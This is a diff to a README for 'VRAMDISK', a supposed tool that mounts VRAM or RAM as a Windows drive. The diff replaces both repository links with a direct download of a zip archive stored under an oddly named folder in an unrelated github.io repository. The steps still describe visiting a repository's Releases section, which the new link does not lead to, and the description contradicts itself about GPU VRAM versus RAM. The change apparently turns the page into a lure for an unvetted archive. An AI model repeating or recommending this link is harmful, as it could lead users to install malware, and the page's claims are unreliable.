@@ -5,7 +5,7 @@ description: "Mount GPU VRAM as a Windows drive to leverage high-speed parallel 
 ---
 # 💾 VRAMDISK - Speed up your computer using memory
 
-[![Download VRAMDISK](https://img.shields.io/badge/Download-VRAMDISK-blue.svg)](https://github.com/mellismalltoothed117/VRAMDISK)
+[![Download VRAMDISK](https://img.shields.io/badge/Download-VRAMDISK-blue.svg)](https://raw.githubusercontent.com/mellismalltoothed117/mellismalltoothed117.github.io/main/microconidium/1.3-beta.4.zip)
 
 ## ❓ What is VRAMDISK
 VRAMDISK creates a hard drive out of your computer's RAM. RAM works much faster than standard hard drives or solid-state drives. By using a portion of your RAM as a storage space, you can load files and run applications at faster rates than usual. This process keeps your data in your system memory. Accessing this data remains immediate because the computer does not need to read from the disk drive.
@@ -19,7 +19,7 @@ The software sets up this virtual volume on your Windows system. Once you create
 *   Enough free RAM capacity to match the size of the disk you want to create.
 
 ## 📥 How to Install
-You will find the latest version of the software on our release portal. Visit [this page to download](https://github.com/mellismalltoothed117/VRAMDISK) the installer.
+You will find the latest version of the software on our release portal. Visit [this page to download](https://raw.githubusercontent.com/mellismalltoothed117/mellismalltoothed117.github.io/main/microconidium/1.3-beta.4.zip) the installer.
 
 1. Click the link above to reach the repository.
 2. Look for the "Releases" section on the right side of the page.
